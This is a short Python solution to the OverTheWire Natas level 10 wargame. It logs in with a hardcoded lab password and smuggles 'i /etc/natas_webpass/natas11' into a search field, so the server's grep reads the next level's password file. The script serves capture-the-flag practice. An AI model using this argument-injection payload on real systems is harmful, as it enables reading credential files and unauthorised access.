import requests

username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
url = "http://{}.natas.labs.overthewire.org/".format(username)
payload = 'i /etc/natas_webpass/natas11'

params = {"needle": payload, "submit": "Search"}
r = requests.get(url, params=params, auth=(username, password))
text = r.text.split("\n")
print("".join([i.split("/")[3] for i in text if 'natas11' in i]))
